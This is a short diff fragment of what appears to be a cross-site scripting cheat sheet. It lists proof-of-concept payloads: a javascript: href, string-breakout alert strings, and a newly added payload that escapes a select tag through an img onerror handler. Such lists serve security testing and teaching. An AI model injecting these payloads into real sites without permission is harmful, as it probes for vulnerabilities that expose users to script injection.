@@ -16,3 +16,4 @@
 4. Anything put inside href use this payload `javascript:alert()`
 5. `'-alert(1)-'`
 6. or `'; alert();'`
+7. break out an select tag: `</select><img src=1 onerror=alert()>`
